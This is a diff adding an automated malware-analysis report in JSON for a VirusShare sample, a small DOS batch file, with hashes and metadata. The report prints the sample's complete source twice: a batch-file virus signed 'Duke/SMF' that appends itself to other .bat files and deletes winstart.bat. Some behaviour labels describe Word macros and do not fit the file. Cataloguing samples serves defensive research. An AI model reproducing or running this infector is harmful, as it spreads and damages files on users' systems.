@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off %SMF%\nif \"%1==\"@ goto SMFz\necho.>SMF.bat\nfind \"SMF\"<%0>>SMF.bat\nfor %%b in (*.bat) do call SMF.bat @ %%b\ndel SMF.bat\ndel c:\\windows\\winstart.bat>nul %SMF%\ngoto SMF\n:SMFz [SBVM]\nif \"%2==\"autoexec.bat goto SMF\nfind \"SMF\"<%2>nul\nif errorlevel 1 type SMF.bat>>%2\n:SMF by Duke/SMF"
+    },
+    "filename": "VirusShare_1079c7d64e654b52c423f85ead4d6bab",
+    "filesize": 299,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1079c7d64e654b52c423f85ead4d6bab",
+        "sha1": "5a9fdb065a2cb7f70bf467087db07871185bd75c",
+        "sha256": "6ef05fa448be996f197ae79b6444d6f55f38e5ea1ceeac0257842c4bc28cf959"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off %SMF%",
+            "if \"%1==\"@ goto SMFz",
+            "echo.>SMF.bat",
+            "find \"SMF\"<%0>>SMF.bat",
+            "for %%b in (*.bat) do call SMF.bat @ %%b",
+            "del SMF.bat",
+            "del c:\\windows\\winstart.bat>nul %SMF%",
+            "goto SMF",
+            ":SMFz [SBVM]",
+            "if \"%2==\"autoexec.bat goto SMF",
+            "find \"SMF\"<%2>nul",
+            "if errorlevel 1 type SMF.bat>>%2",
+            ":SMF by Duke/SMF"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.300473",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
